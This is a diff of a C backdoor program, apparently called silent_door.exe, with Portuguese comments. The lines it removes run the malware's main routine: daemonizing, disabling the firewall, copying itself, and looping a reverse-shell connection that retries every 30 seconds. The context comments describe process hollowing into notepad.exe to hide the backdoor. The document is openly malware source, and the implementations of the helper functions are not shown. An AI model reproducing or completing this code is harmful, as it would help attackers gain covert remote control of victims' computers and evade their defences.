@@ -21,8 +21,6 @@ terraquian date: 10/05/2019 - 13:21 -PM *** in desenvolpment.
 int main()
 
 {
-    // 1. Torna-se um processo daemon para rodar em segundo plano.
-    daemonize();
     #if defined(_WIN32) || defined(_WIN64)
         // No Windows, em vez de rodar diretamente, vamos nos injetar
         // em um processo legítimo para nos escondermos.
@@ -35,28 +33,17 @@ int main()
         char selfPath[MAX_PATH];
         GetModuleFileName(NULL, selfPath, MAX_PATH);
 
-    // 2. Executa tarefas de instalação uma vez.
-    kill_frwl();
-    auto_copy();
         // A função mágica que realiza o Process Hollowing.
         // Ela iniciaria notepad.exe suspenso, injetaria o código de selfPath
         // e o retomaria.
         // InjectAndRun(targetProcess, selfPath);
 
-    // 3. Entra no loop principal para manter a conexão reversa.
-    while(1) {
-        // A função shell agora tentará conectar e fornecer um shell.
-        // Se a conexão cair, o loop fará com que ela tente se reconectar.
-        shell();
-        sleep(30); // Espera 30 segundos antes de tentar reconectar.
-    }
         // Se a injeção for bem-sucedida, o processo original (silent_door.exe)
         // pode se encerrar, pois o backdoor agora está rodando dentro do notepad.exe.
         // A lógica abaixo NUNCA seria executada pelo processo original.
         // Ela só existe para ser injetada.
     #endif
 
-    return 0; // Inalcançável, mas bom para completude.
     // =======================================================================
     // ESTE É O CÓDIGO QUE RODARÁ DENTRO DO PROCESSO HOSPEDEIRO (ex: notepad.exe)
     // =======================================================================
